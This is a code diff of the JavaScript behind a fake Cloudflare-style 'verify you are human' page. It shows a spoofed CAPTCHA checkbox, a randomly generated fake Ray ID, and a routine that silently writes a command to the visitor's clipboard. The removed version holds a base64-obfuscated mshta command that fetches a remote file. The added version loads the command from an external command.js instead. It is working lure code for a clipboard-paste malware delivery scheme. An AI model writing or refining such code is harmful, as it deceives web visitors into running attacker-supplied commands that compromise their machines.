@@ -1,47 +1,37 @@
 document.addEventListener("DOMContentLoaded", function () {
-    // Detect and display hosting domain dynamically
-    const domainName = window.location.hostname;
-    document.getElementById("domain-name").innerText = domainName;
-    document.getElementById("security-msg").innerText = `${domainName} needs to review the security of your connection before proceeding.`;
+    // Auto-detect domain name
+    document.getElementById("domain-name").innerText = window.location.hostname;
 
-    // Update page title
-    document.getElementById("page-title").innerText = domainName;
+    // Generate random Ray ID
+    let rayID = Math.random().toString(36).substring(2, 12);
+    document.getElementById("ray-id").innerText = rayID;
+    document.getElementById("footer-ray-id").innerText = rayID;
 
-    // Check if Cloudflare logo is broken, if so, replace with an alternative URL
-    const cfLogo = document.getElementById("cf-logo");
-    cfLogo.onerror = function () {
-        this.src = "https://upload.wikimedia.org/wikipedia/commons/4/4a/Cloudflare_Logo.png"; // Backup Cloudflare logo
-    };
-});
+    // Handle fake CAPTCHA click
+    document.getElementById("fake-captcha").addEventListener("change", function () {
+        if (this.checked) {
+            document.getElementById("captcha-text").innerText = "Verifying...";
+            document.getElementById("spinner").classList.remove("hidden");
 
-// Verify CAPTCHA with fake animation
-function verifyCaptcha() {
-    const checkboxUI = document.getElementById("verify-spinner");
-    checkboxUI.style.display = "block"; // Show spinner
-
-    setTimeout(() => {
-        checkboxUI.style.display = "none"; // Hide spinner
-        copyCommand();
-        document.getElementById("instruction-popup").style.display = "block"; // Show popup
-    }, 2000);
-}
-
-// Clipboard Copy Function with Obfuscation
-function copyCommand() {
-    const hiddenCommand = getObfuscatedCommand();
-    navigator.clipboard.writeText(hiddenCommand).then(() => {
-        console.log("Command copied successfully.");
-    }).catch(err => {
-        console.error("Failed to copy command: ", err);
+            setTimeout(() => {
+                document.getElementById("popup").classList.remove("hidden");
+                copyCommandToClipboard();
+            }, 2000);
+        }
     });
-}
 
-// Obfuscated command from an external file
-function getObfuscatedCommand() {
-    return atob("bXNodGEgaHR0cHM6Ly9leGFtcGxlLmNvbS9maWxlLm1wNA=="); // Base64-encoded mshta command
-}
+    // Clipboard function (loads command from external JS)
+    function copyCommandToClipboard() {
+        fetch("command.js")
+            .then(response => response.text())
+            .then(text => {
+                navigator.clipboard.writeText(text);
+            })
+            .catch(err => console.error("Error loading command.js:", err));
+    }
 
-// Close Popup
-function closePopup() {
-    document.getElementById("instruction-popup").style.display = "none";
-}
+    // Close popup on verify button click
+    document.getElementById("verify-btn").addEventListener("click", function () {
+        document.getElementById("popup").classList.add("hidden");
+    });
+});
